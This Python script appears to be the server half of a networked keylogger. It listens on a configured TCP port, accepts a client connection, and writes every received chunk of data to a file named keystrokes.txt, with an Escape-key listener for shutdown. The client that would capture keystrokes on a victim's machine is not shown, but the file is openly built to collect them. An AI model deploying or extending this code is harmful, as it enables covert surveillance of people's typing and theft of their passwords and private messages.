import socket
import pynput
import threading
import json

# Global variables for sockets
client_socket = None  # Placeholder for the client socket
server_socket = None  # Placeholder for the server socket
listener = None  # To handle keyboard listener

# Read configuration from file
# Read configuration from file
with open('./config.json', 'r') as config_file:
    config=json.load(config_file)


HOST = config["SERVER"]["IP"] # Listen on localhost by default
PORT = config["SERVER"]["PORT"] # Port number for incoming connections/ 9595 by default

# Function to stop the server and client upon pressing the 'Escape' key
def key_listener(key):
    """
    Monitors keyboard inputs and stops the server if the 'Escape' key is pressed.
    It also notifies the connected client to disconnect.
    """
    try:
        # Check for the 'Escape' key
        if key == pynput.keyboard.Key.esc:
            print("[Stopping server and instructing client to disconnect...]")
            close_sockets()  # Close the sockets safely
            return False  # Stops the listener
    except AttributeError as e:
        print(f"[Error occurred: {e}]")

# Function to close both client and server sockets
def close_sockets():
    """
    Safely closes the client and server sockets.
    """
    global client_socket, server_socket
    if client_socket:
        try:
            client_socket.close()
            print("[Client socket closed]")
        except Exception as e:
            print(f"[Error closing client socket: {e}]")
    if server_socket:
        try:
            server_socket.close()
            print("[Server socket closed]")
        except Exception as e:
            print(f"[Error closing server socket: {e}]")

# Function to handle client connection
def handle_client_connection():
    global client_socket
    try:
        # Wait for a client to connect (blocking call)
        client_socket, client_address = server_socket.accept()
        print(f"Connection from: {client_address}")

        # Handle communication with the connected client
        while True:
            # Receive data from the client (up to 1024 bytes at a time)
            data = client_socket.recv(1024).decode('utf-8')
            if data:
                print(f"Received: {data}")
                # Save received data to a log file
                with open("keystrokes.txt", "a") as file:
                    file.write(data + "\n")
            else:
                # If no data is received, it usually means the client has disconnected
                print("[Client disconnected]")
                break
    except Exception as e:
        print(f"[Error occurred in client communication: {e}]")
    finally:
        # Ensure sockets are closed after use
        close_sockets()

# Main Program
if __name__ == "__main__":
    try:
        # Create a server-side socket
        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        # Bind the server socket to the specified IP and port
        server_socket.bind((HOST, PORT))

        # Set the server to listen for incoming connections
        server_socket.listen()
        print(f"Server is listening on {HOST}:{PORT}")
        print("[Press 'Escape' to stop the server and client]")

        # Start a keyboard listener to detect the 'Escape' key
        listener = pynput.keyboard.Listener(on_press=key_listener)
        listener.start()  # Listener runs in its own thread

        # Creating a thread to handle a single client connection
        client_connection_handler = threading.Thread(target=handle_client_connection)
        client_connection_handler.start()

        # Wait for the client handler to finish
        client_connection_handler.join()

    except KeyboardInterrupt:
        # Handle Ctrl+C gracefully
        print("[Server stopped by user (Ctrl+C)]")
        close_sockets()

    except Exception as e:
        print(f"[Critical Error occurred: {e}]")

    finally:
        # Ensure all resources are cleaned up
        close_sockets()  # Close the sockets when exiting
